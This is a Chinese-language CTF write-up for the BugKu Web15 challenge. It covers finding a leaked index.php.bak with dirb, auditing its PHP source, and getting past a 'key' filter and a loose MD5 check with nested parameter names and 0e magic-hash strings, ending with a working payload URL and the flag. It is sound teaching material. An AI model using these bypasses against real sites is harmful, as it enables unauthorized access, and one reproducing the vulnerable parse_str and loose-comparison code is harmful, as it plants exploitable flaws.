
# BugKu Web15 - 备份是个好习惯

## 题目信息

- **平台**: BugKu CTF
- **类型**: Web
- **难度**: ⭐⭐
- **金币**: 2
- **分数**: 20

## 题目描述

打开题目后，页面没有明显内容，提示与“备份”有关。需要通过目录扫描找到备份文件，审计源码，利用 PHP 弱类型比较绕过 MD5 校验，获取 Flag。

## 解题过程

### 1. 信息收集

访问题目地址，页面空白，查看源代码也没有有用信息。

使用 `dirb` 扫描备份文件：

```bash
dirb http://160.202.254.160:12231/ -X .bak
```

扫描结果中发现：

```text
http://160.202.254.160:12231/index.php.bak
```

访问该备份文件，下载得到 `index.php.bak`。

### 2. 代码审计

打开备份文件，源码如下：

```php
<?php
/**
 * Created by PhpStorm.
 * User: Norse
 * Date: 2017/8/6
 * Time: 20:22
*/

include_once "flag.php";
ini_set("display_errors", 0);
$str = strstr($_SERVER['REQUEST_URI'], '?');
$str = substr($str,1);
$str = str_replace('key','',$str);
parse_str($str);
echo md5($key1);

echo md5($key2);
if(md5($key1) == md5($key2) && $key1 !== $key2){
    echo $flag."取得flag";
}
?>
```

代码逻辑分析：

1. 从 `$_SERVER['REQUEST_URI']` 中取出 `?` 后面的查询字符串。
2. 使用 `str_replace('key','',$str)` 过滤掉所有 `key` 子串。
3. 使用 `parse_str($str)` 解析参数，得到变量 `$key1` 和 `$key2`。
4. 输出两个 MD5 值。
5. 如果：
   - `md5($key1) == md5($key2)`（弱比较相等）
   - 且 `$key1 !== $key2`（严格不相等）
   - 则输出 Flag。

### 3. 绕过思路

#### 3.1 绕过 `key` 过滤

因为代码会删除 `key`，所以直接传参：

```text
?key1=xxx&key2=yyy
```

会被过滤成：

```text
1=xxx&2=yyy
```

导致变量名错误，无法得到 `$key1` 和 `key2`。

可以利用过滤后重新拼接变量名：

- `kkeyey1` 删除中间的 `key` 后变成 `key1`
- `kkeyey2` 删除中间的 `key` 后变成 `key2`

所以 Payload 中的参数名写成：

```text
?kkeyey1=xxx&kkeyey2=yyy
```

最终 `parse_str` 解析的是：

```text
key1=xxx&key2=yyy
```

#### 3.2 绕过 MD5 弱比较

使用两个不同的字符串，它们的 MD5 值都以 `0e` 开头：

| 字符串 | MD5 值 |
|---|---|
| `240610708` | `0e462097431906509019562988736854` |
| `QNKCDZO` | `0e830400451993494058024219903391` |

在 PHP 中，使用 `==` 比较时，`0e...` 会被解释为科学计数法，两个值都等于 `0`，因此：

```php
md5('240610708') == md5('QNKCDZO')
// true
```

同时：

```php
'240610708' !== 'QNKCDZO'
// true
```

满足条件，输出 Flag。

### 4. 构造最终 Payload

```text
http://160.202.254.160:12231/?kkeyey1=240610708&kkeyey2=QNKCDZO
```

### 5. 获取 Flag

访问 Payload，页面输出：

```text
0e4620974319065090195629887368540e830400451993494058024219903391flag{855063c178982837477b11ee9c4bb02e}取得flag
```

Flag 成功获取。

---

## 知识点总结

- **备份文件泄露**  
  常见备份后缀：`.bak`、`.swp`、`.old`、`.~`、`.backup` 等。通过目录扫描工具可以发现备份文件。

- **`str_replace` 过滤绕过**  
  当代码过滤某个字符串时，可以构造包含该字符串的参数名，使其被删除后拼接成目标变量名。

- **PHP MD5 0e 碰撞**  
  PHP 在使用 `==` 比较两个字符串时，如果字符串是科学计数法格式（如 `0e...`），会将其转换为数字进行比较。`0e` 开头的 MD5 值会被视为 `0`，从而造成弱比较绕过。

- **`parse_str` 变量覆盖**  
  `parse_str()` 会将查询字符串解析为当前作用域中的变量，可利用这一点动态覆盖 `$key1` 和 `$key2`。

---

## 原理分析

本题中，开发者对查询字符串做了过滤：

```php
$str = str_replace('key','',$str);
```

但过滤不彻底，攻击者可以使用 `kkeyey1` 这样的参数名，使过滤后重新变成 `key1`。

同时，MD5 校验使用了弱比较 `==`，而不是严格比较 `===`，因此可以利用两个 MD5 值均为 `0e` 开头的字符串绕过。

最终，`md5($key1) == md5($key2)` 为 `true`，`$key1 !== $key2` 为 `true`，成功触发 Flag 输出。

---

## 参考

- [BugKu CTF 平台](https://ctf.bugku.com/)
